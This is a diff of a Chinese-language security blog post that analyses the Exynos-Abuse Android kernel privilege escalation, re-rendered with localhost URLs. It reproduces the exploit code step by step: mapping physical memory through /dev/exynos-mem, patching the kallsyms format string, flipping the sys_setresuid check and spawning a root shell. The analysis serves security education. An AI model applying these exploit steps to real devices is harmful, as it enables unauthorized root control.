@@ -9,7 +9,7 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="Privilege Escalation in Kernel 101 - mmap &#8211; ">
 <meta property="og:description" content="ShenYuanV's White Paper for Security">
-<meta property="og:url" content="http://shenyuanv.github.io/2014/03/14/privilege_escalation_in_kernel_101_mmap.html">
+<meta property="og:url" content="http://localhost:4000/2014/03/14/privilege_escalation_in_kernel_101_mmap.html">
 <meta property="og:site_name" content="">
 
 <!-- Webmaster Tools verfication -->
@@ -17,14 +17,14 @@
 
 
 
-<link rel="canonical" href="http://shenyuanv.github.io/2014/03/14/privilege_escalation_in_kernel_101_mmap.html">
-<link href="http://shenyuanv.github.io/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">
+<link rel="canonical" href="http://localhost:4000/2014/03/14/privilege_escalation_in_kernel_101_mmap.html">
+<link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">
 
 <meta http-equiv="content-type" content="text/html; charset=utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<link rel="stylesheet" href="http://shenyuanv.github.io/css/base.min.css" type="text/css" />
-<link rel="stylesheet" href="http://shenyuanv.github.io/css/github.min.css" type="text/css" />
-<link rel="stylesheet" href="http://shenyuanv.github.io/css/octicons.css" type="text/css" />
+<link rel="stylesheet" href="http://localhost:4000/css/base.min.css" type="text/css" />
+<link rel="stylesheet" href="http://localhost:4000/css/github.min.css" type="text/css" />
+<link rel="stylesheet" href="http://localhost:4000/css/octicons.css" type="text/css" />
 <link href='http://fonts.googleapis.com/css?family=Lato' rel='stylesheet' type='text/css'>
 
 </head>
@@ -50,10 +50,10 @@
 <div class="post">
 <h1 id="privilege-escalation-101">Privilege Escalation 101</h1>
 
-<h2 id="mmapremappfnrange">mmap&amp;remap_pfn_range</h2>
+<h2 id="mmapremap_pfn_range">mmap&amp;remap_pfn_range</h2>
 
-<h1 id="section">漏洞成因</h1>
-<p>在一段时期,各个厂商经常出现的漏洞中其中之一就是通过mmap控制全部物理内存.而出现这个问题的原因就是驱动开发人员没有正确地对remap_pfn_range这个函数中的参数做处理.</p>
+<p>#漏洞成因
+在一段时期,各个厂商经常出现的漏洞中其中之一就是通过mmap控制全部物理内存.而出现这个问题的原因就是驱动开发人员没有正确地对remap_pfn_range这个函数中的参数做处理.</p>
 
 <p><a href="http://linux.die.net/man/2/mmap">mmap man page</a></p>
 
@@ -61,44 +61,42 @@
 
 <p>下面是mmap的linux API,它的作用是将指定地址和大小的内存映射到用户空间中以便程序进行内存操作,offset传入需要映射的物理地址偏移,length传入需要映射的长度.</p>
 
-<p><code class="highlighter-rouge">c
-void *mmap(void *addr, size_t length, int prot, int flags,
-           int fd, off_t offset);
-</code>
-<strong>The mmap function asks to map length bytes starting  at offset  offset from  the  file  (or  other object) specified by the file descriptor fd into memory, preferably at address start.  This  latter  address  is  a hint  only,  and is usually specified as 0.  The actual place where the object is mapped is returned by mmap, and is never 0.</strong></p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="o">*</span><span class="n">mmap</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">length</span><span class="p">,</span> <span class="kt">int</span> <span class="n">prot</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span>
+           <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">off_t</span> <span class="n">offset</span><span class="p">);</span>
+</code></pre></div></div>
+<p><strong>The mmap function asks to map length bytes starting  at offset  offset from  the  file  (or  other object) specified by the file descriptor fd into memory, preferably at address start.  This  latter  address  is  a hint  only,  and is usually specified as 0.  The actual place where the object is mapped is returned by mmap, and is never 0.</strong></p>
 
 <p>mmap是用户空间对内核请求映射内存的一个接口,调用这个接口后如果相关驱动支持此操作,会实现一个响应mmap的函数,一般情况下会在这个响应函数中调用remap_pfn_range,下面是linux man page上对remap_pfn_range的一个简单示例：</p>
 
-<p>```c
-static int simple_remap_mmap(struct file *filp, struct vm_area_struct *vma)
-{
-    if (remap_pfn_range(vma, vma-&gt;vm_start, vm-&gt;vm_pgoff,
-                vma-&gt;vm_end - vma-&gt;vm_start,
-                vma-&gt;vm_page_prot))
-        return -EAGAIN;</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">simple_remap_mmap</span><span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="k">struct</span> <span class="n">vm_area_struct</span> <span class="o">*</span><span class="n">vma</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">remap_pfn_range</span><span class="p">(</span><span class="n">vma</span><span class="p">,</span> <span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_start</span><span class="p">,</span> <span class="n">vm</span><span class="o">-&gt;</span><span class="n">vm_pgoff</span><span class="p">,</span>
+                <span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_end</span> <span class="o">-</span> <span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_start</span><span class="p">,</span>
+                <span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_page_prot</span><span class="p">))</span>
+        <span class="k">return</span> <span class="o">-</span><span class="n">EAGAIN</span><span class="p">;</span>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>vma-&gt;vm_ops = &amp;simple_remap_vm_ops;
-simple_vma_open(vma);
-return 0; } ``` 如果这段代码被直接用到驱动上,问题就来了,因为vma中的参数是根据用户空间调用mmap时传入的参数构造而成.用户空间可以传入内核代码段的物理地址,并将其标识为可读写,从而修改内核空间的代码.
-</code></pre>
-</div>
+    <span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_ops</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">simple_remap_vm_ops</span><span class="p">;</span>
+    <span class="n">simple_vma_open</span><span class="p">(</span><span class="n">vma</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>如果这段代码被直接用到驱动上,问题就来了,因为vma中的参数是根据用户空间调用mmap时传入的参数构造而成.用户空间可以传入内核代码段的物理地址,并将其标识为可读写,从而修改内核空间的代码.</p>
 
-<h1 id="section-1">保护机制</h1>
+<p>#保护机制</p>
 
 <p>一个程序的内存空间可以分为两个部分,用户空间（user space）、内核空间（kernel space）,在正常情况下,操作系统中运行的程序只能够控制自身用户空间的内存,而内核空间是由操作系统控制,且运行在特权模式.一个程序的凭据（credential）保存了自身uid、权限等信息,而凭据储存在内核空间,所以运行在用户空间的普通程序无法修改自身的凭据,这就是linux的权限控制的一部分,它保证了操作系统的安全性.</p>
 
-<p><code class="highlighter-rouge">
-|--------------|
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>|--------------|
 | kernel space |
 |--------------|
 | user space   |
 |--------------|
-</code>
-##获取全部物理地址的操作能力后提权思路
+</code></pre></div></div>
+<p>##获取全部物理地址的操作能力后提权思路
 由于系统中存在能够在用户空间操作所有内存（包括内核地址内存）时,普通程序通过修改内核代码段的机器码即可让内核执行任意命令,从而达到提权的目的.</p>
 
-<h1 id="exynos-abuse">具体案例Exynos-Abuse</h1>
-<p>Exynos-Abuse是其中一个最典型的案例,而且这个漏洞的利用代码也早早地公布了出来,从公布的利用代码来对这类漏洞的利用方式进行分析是最有效的方法.</p>
+<p>#具体案例Exynos-Abuse 
+Exynos-Abuse是其中一个最典型的案例,而且这个漏洞的利用代码也早早地公布了出来,从公布的利用代码来对这类漏洞的利用方式进行分析是最有效的方法.</p>
 
 <p><a href="https://raw.githubusercontent.com/mwrlabs/mercury-modules/master/metall0id/root/exynosmem/exynos-abuse/jni/exynos-abuse.c">Exynos-Abuse完整利用代码</a>
 ##获取全部物理地址的操作能力
@@ -106,127 +104,124 @@ return 0; } ``` 如果这段代码被直接用到驱动上,问题就来了,因�
 
 <p>程序打开有漏洞的驱动后,通过mmap调用了内存映射的方法,参数中length和PHYS_OFFSET是至关重要的两个参数.</p>
 
-<p>```c
-  #define PHYS_OFFSET 0x40000000
-    ……
-  int page_size = sysconf(_SC_PAGE_SIZE);
-  int length = page_size * page_size;
-    ……
-    /* open the door */
-  fd = open(“/dev/exynos-mem”, O_RDWR);//打开有漏洞的驱动
-  if (fd == -1) {
-    printf(“[!] Error opening /dev/exynos-mem\n”);
-    exit(1);
-  }</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="cp">#define PHYS_OFFSET 0x40000000
+</span>    <span class="p">......</span>
+  <span class="kt">int</span> <span class="n">page_size</span> <span class="o">=</span> <span class="n">sysconf</span><span class="p">(</span><span class="n">_SC_PAGE_SIZE</span><span class="p">);</span>
+  <span class="kt">int</span> <span class="n">length</span> <span class="o">=</span> <span class="n">page_size</span> <span class="o">*</span> <span class="n">page_size</span><span class="p">;</span>
+    <span class="p">......</span>
+    <span class="cm">/* open the door */</span>
+  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/exynos-mem"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span><span class="c1">//打开有漏洞的驱动
+</span>  <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error opening /dev/exynos-mem</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>/* kernel reside at the start of physical memory, so take some Mb */   paddr = (unsigned long *)mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_SHARED, fd, PHYS_OFFSET);//调用驱动的mmap对应接口,传入kernel text的起始物理地址   tmp = paddr;   if (paddr == MAP_FAILED) {
- printf("[!] Error mmap: %s|%08X\n",strerror(errno), i);
- exit(1);   } ``` 要定位到想要修改的函数地址就需要获取内核符号表,一般情况下在执行打印内核符号表的函数时由于/proc/sys/kptr_restrict的限制,所有符号表地址都会打印为0,.在内核数据段中寻找字符串"%pK %c %s\n",并将其修改为"%p %c %s\n",可以绕过此限制将内核函数的正确地址打印出来.
-</code></pre>
-</div>
+    <span class="cm">/* kernel reside at the start of physical memory, so take some Mb */</span>
+  <span class="n">paddr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="o">|</span><span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="n">PHYS_OFFSET</span><span class="p">);</span><span class="c1">//调用驱动的mmap对应接口,传入kernel text的起始物理地址
+</span>  <span class="n">tmp</span> <span class="o">=</span> <span class="n">paddr</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">paddr</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
+     <span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error mmap: %s|%08X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">),</span> <span class="n">i</span><span class="p">);</span>
+     <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+  <span class="p">}</span>
+</code></pre></div></div>
+<p>要定位到想要修改的函数地址就需要获取内核符号表,一般情况下在执行打印内核符号表的函数时由于/proc/sys/kptr_restrict的限制,所有符号表地址都会打印为0,.在内核数据段中寻找字符串”%pK %c %s\n”,并将其修改为”%p %c %s\n”,可以绕过此限制将内核函数的正确地址打印出来.</p>
 
-<p>```c
-    /*
-     * search the format string “%pK %c %s\n” in memory
-     * and replace “%pK” by “%p” to force display kernel
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="cm">/*
+     * search the format string "%pK %c %s\n" in memory
+     * and replace "%pK" by "%p" to force display kernel
      * symbols pointer
-     修改内核符号表打印函数中的”%pK %c %s\n”,并将其修改为”%p %c %s\n”
-     <em>/
-    for(m = 0; m &lt; length; m += 4) {
-        if(</em>(unsigned long <em>)tmp == 0x204b7025 &amp;&amp; *(unsigned long *)(tmp+1) == 0x25206325 &amp;&amp; *(unsigned long *)(tmp+2) == 0x00000a73 ) {
-            printf(“[</em>] s_show-&gt;seq_printf format string found at: 0x%08X\n”, PAGE_OFFSET + m);
-            restore_ptr_fmt = tmp;
-            <em>(unsigned long</em>)tmp = 0x20207025;//找到格式化字符串以后修改之
-            found = true;
-            break;
-        }
-        tmp++;
-    }</p>
+     修改内核符号表打印函数中的"%pK %c %s\n",并将其修改为"%p %c %s\n"
+     */</span>
+    <span class="k">for</span><span class="p">(</span><span class="n">m</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">m</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">;</span> <span class="n">m</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">tmp</span> <span class="o">==</span> <span class="mh">0x204b7025</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">tmp</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x25206325</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">tmp</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x00000a73</span> <span class="p">)</span> <span class="p">{</span>
+            <span class="n">printf</span><span class="p">(</span><span class="s">"[*] s_show-&gt;seq_printf format string found at: 0x%08X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">PAGE_OFFSET</span> <span class="o">+</span> <span class="n">m</span><span class="p">);</span>
+            <span class="n">restore_ptr_fmt</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span>
+            <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="o">*</span><span class="p">)</span><span class="n">tmp</span> <span class="o">=</span> <span class="mh">0x20207025</span><span class="p">;</span><span class="c1">//找到格式化字符串以后修改之
+</span>            <span class="n">found</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">tmp</span><span class="o">++</span><span class="p">;</span>
+    <span class="p">}</span>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>if (found == false) {
-    printf("[!] s_show-&gt;seq_printf format string not found\n");
-    exit(1);
-} ``` 拿到内核符号表后就可以定位需要修改的系统调用setresuid的地址了,查找地址的方法为读取/proc/kallsyms的值,修改上面的格式化字符串后再访问改文件时,获取到的地址已经是正确的内核地址.
-</code></pre>
-</div>
+    <span class="k">if</span> <span class="p">(</span><span class="n">found</span> <span class="o">==</span> <span class="nb">false</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[!] s_show-&gt;seq_printf format string not found</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+<p>拿到内核符号表后就可以定位需要修改的系统调用setresuid的地址了,查找地址的方法为读取/proc/kallsyms的值,修改上面的格式化字符串后再访问改文件时,获取到的地址已经是正确的内核地址.</p>
 
-<p>```c
-    found = false;</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">found</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>/* kallsyms now display symbols address */       
-kallsyms = fopen("/proc/kallsyms", "r");
-if (kallsyms == NULL) {
-    printf("[!] kallsysms error: %s\n", strerror(errno));
-    exit(1);
-}
+    <span class="cm">/* kallsyms now display symbols address */</span>       
+    <span class="n">kallsyms</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"/proc/kallsyms"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">kallsyms</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[!] kallsysms error: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
 
-/* parse /proc/kallsyms to find sys_setresuid address */
-while((ptr = fgets(line, 512, kallsyms))) {
-    str = strtok(ptr, " ");
-    addr_sym = strtoul(str, NULL, 16);
-    index = 1;
-    while(str) {
-        str = strtok(NULL, " ");
-        index++;
-        if (index == 3) {
-            if (strncmp("sys_setresuid\n", str, 14) == 0) {
-                printf("[*] sys_setresuid found at 0x%08X\n",addr_sym);
-                found = true;
-            }
-            break;
-        }
-    } ``` 找到setresuid的地址后开始搜索cmp r0,#0的机器码,找到后通过把setresuid中的cmp r0,#0,修改为cmp r0,#1将权限检查的逻辑取反.
-</code></pre>
-</div>
+    <span class="cm">/* parse /proc/kallsyms to find sys_setresuid address */</span>
+    <span class="k">while</span><span class="p">((</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="mi">512</span><span class="p">,</span> <span class="n">kallsyms</span><span class="p">)))</span> <span class="p">{</span>
+        <span class="n">str</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="s">" "</span><span class="p">);</span>
+        <span class="n">addr_sym</span> <span class="o">=</span> <span class="n">strtoul</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
+        <span class="n">index</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="k">while</span><span class="p">(</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">str</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">" "</span><span class="p">);</span>
+            <span class="n">index</span><span class="o">++</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="s">"sys_setresuid</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">str</span><span class="p">,</span> <span class="mi">14</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] sys_setresuid found at 0x%08X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">addr_sym</span><span class="p">);</span>
+                    <span class="n">found</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+</code></pre></div></div>
+<p>找到setresuid的地址后开始搜索cmp r0,#0的机器码,找到后通过把setresuid中的cmp r0,#0,修改为cmp r0,#1将权限检查的逻辑取反.</p>
 
-<p><code class="highlighter-rouge">c
-        if (found) {
-            tmp = paddr;
-            tmp += (addr_sym - PAGE_OFFSET) &gt;&gt; 2;
-            for(m = 0; m &lt; 128; m += 4) {
-                if (*(unsigned long *)tmp == 0xe3500000) {
-                    printf("[*] patching sys_setresuid at 0x%08X\n",addr_sym+m);
-                    restore_ptr_setresuid = tmp;
-                    *(unsigned long *)tmp = 0xe3500001;
-                    break;
-                }
-                tmp++;
-            }
-            break;
-        }
-    }
-</code>
-此时内核代码中setresuid的权限检查逻辑已经取反,之前没有权限执行setresuid的程序现在可以执行成功了.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">if</span> <span class="p">(</span><span class="n">found</span><span class="p">)</span> <span class="p">{</span>
+            <span class="n">tmp</span> <span class="o">=</span> <span class="n">paddr</span><span class="p">;</span>
+            <span class="n">tmp</span> <span class="o">+=</span> <span class="p">(</span><span class="n">addr_sym</span> <span class="o">-</span> <span class="n">PAGE_OFFSET</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">;</span>
+            <span class="k">for</span><span class="p">(</span><span class="n">m</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">m</span> <span class="o">&lt;</span> <span class="mi">128</span><span class="p">;</span> <span class="n">m</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">tmp</span> <span class="o">==</span> <span class="mh">0xe3500000</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="n">printf</span><span class="p">(</span><span class="s">"[*] patching sys_setresuid at 0x%08X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">addr_sym</span><span class="o">+</span><span class="n">m</span><span class="p">);</span>
+                    <span class="n">restore_ptr_setresuid</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span>
+                    <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">tmp</span> <span class="o">=</span> <span class="mh">0xe3500001</span><span class="p">;</span>
+                    <span class="k">break</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="n">tmp</span><span class="o">++</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+<p>此时内核代码中setresuid的权限检查逻辑已经取反,之前没有权限执行setresuid的程序现在可以执行成功了.</p>
 
-<p>```c
-    fclose(kallsyms);</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">fclose</span><span class="p">(</span><span class="n">kallsyms</span><span class="p">);</span>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>/* to be sure memory is updated */
-usleep(100000);
+    <span class="cm">/* to be sure memory is updated */</span>
+    <span class="n">usleep</span><span class="p">(</span><span class="mi">100000</span><span class="p">);</span>
 
-/* ask for root */
-result = setresuid(0, 0, 0);
+    <span class="cm">/* ask for root */</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
 
-/* restore memory */
-*(unsigned long *)restore_ptr_fmt = 0x204b7025;
-*(unsigned long *)restore_ptr_setresuid = 0xe3500000;
-munmap(paddr, length);
-close(fd);
+    <span class="cm">/* restore memory */</span>
+    <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">restore_ptr_fmt</span> <span class="o">=</span> <span class="mh">0x204b7025</span><span class="p">;</span>
+    <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">restore_ptr_setresuid</span> <span class="o">=</span> <span class="mh">0xe3500000</span><span class="p">;</span>
+    <span class="n">munmap</span><span class="p">(</span><span class="n">paddr</span><span class="p">,</span> <span class="n">length</span><span class="p">);</span>
+    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
 
-if (result) {
-    printf("[!] set user root failed: %s\n", strerror(errno));
-    exit(1);
-}
+    <span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"[!] set user root failed: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
 
-/* execute a root shell */
-execve (cmd[0], cmd, env);
-</code></pre>
-</div>
+    <span class="cm">/* execute a root shell */</span>
+    <span class="n">execve</span> <span class="p">(</span><span class="n">cmd</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">env</span><span class="p">);</span>
 
-<p>return 0;
-}
-```
-当execve函数运行时该程序的uid已经设置为0,如果执行的命令为”/system/bin/sh”,将会看到命令行的用户由”shell$”变成了”root#”.
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>当execve函数运行时该程序的uid已经设置为0,如果执行的命令为”/system/bin/sh”,将会看到命令行的用户由”shell$”变成了”root#”.
 #小结
 以上的例子是在32位系统中没有开启内核代码只读的情况下才能够利用成功,由于攻防的演进,后面Android系统增加了很多诸如内核代码只读、PXN等安全功能,使得漏洞的完美利用更加困难,但通过此例子可以很好的了解内核提权的步骤以及思路.</p>
 
